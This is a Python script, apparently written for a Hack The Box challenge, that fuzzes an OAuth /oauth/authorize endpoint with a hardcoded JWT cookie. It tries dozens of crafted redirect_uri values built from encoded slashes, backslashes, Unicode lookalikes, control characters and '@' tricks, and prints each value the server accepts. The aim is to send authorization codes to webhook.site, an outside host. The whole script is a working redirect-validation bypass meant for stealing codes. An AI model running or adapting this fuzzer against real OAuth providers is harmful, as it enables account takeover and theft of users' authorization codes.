#!/usr/bin/env python3
import urllib.parse

import requests

TARGET = "http://154.57.164.72:32077"
HOST = "sso.edulearn.htb:32077"
CLIENT = "1a2abb8b-9bb5-4463-8f74-d7b129bb7040"
TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjozLCJlbWFpbCI6ImNvZGV4MzIwNzdAeC5odGIiLCJuYW1lIjoiQ29kZXgiLCJleHAiOjE3ODY2OTYwMjV9.j97ooqhaS-X3Iw1UpvPlcDCN91TC1_56GBR0rOvqIss"

separators = ["\\", "%5c", "%255c", "%2f", "%252f", "/", "／", "＼", "⁄", "∕", "⧵",
              "%09", "%0a", "%0d", "%00", "%23", "%3f", "%40", "\t", "\n", "\r"]
candidates = set()
for sep in separators:
    candidates.update([
        f"http://webhook.site{sep}@edulearn.htb:32077/oauth/callback",
        f"http://webhook.site{sep}%40edulearn.htb:32077/oauth/callback",
        f"http://webhook.site{sep}edulearn.htb:32077/oauth/callback",
        f"http://edulearn.htb:32077{sep}@webhook.site/oauth/callback",
        f"http://edulearn.htb:32077/oauth/callback{sep}@webhook.site/x",
        f"http://edulearn.htb:32077/oauth/callback/{sep}/webhook.site/x",
    ])

candidates.update([
    "http://webhook.site\\@edulearn.htb:32077/oauth/callback",
    "http://webhook.site%5c@edulearn.htb:32077/oauth/callback",
    "http://webhook.site%255c@edulearn.htb:32077/oauth/callback",
    "http://webhook.site%09@edulearn.htb:32077/oauth/callback",
    "http://webhook.site%0d@edulearn.htb:32077/oauth/callback",
    "http://webhook.site%0a@edulearn.htb:32077/oauth/callback",
    "http://edulearn.htb:32077/oauth/callback/../../profile",
    "http://edulearn.htb:32077/oauth/callback/%2e%2e/%2e%2e/profile",
    "http://edulearn.htb:32077/oauth/callback;@webhook.site/x",
    "http://edulearn.htb:32077/oauth/callback?@webhook.site/x",
    "http://edulearn.htb:32077/oauth/callback#@webhook.site/x",
])

session = requests.Session()
for uri in candidates:
    response = session.get(
        f"{TARGET}/oauth/authorize",
        headers={"Host": HOST},
        cookies={"token": TOKEN},
        params={
            "response_type": "code",
            "client_id": CLIENT,
            "scope": "email name",
            "redirect_uri": uri,
        },
        allow_redirects=False,
        timeout=5,
    )
    if response.is_redirect:
        print("ACCEPT\t" + uri.encode("unicode_escape").decode() + "\t" + repr(response.headers.get("Location")))
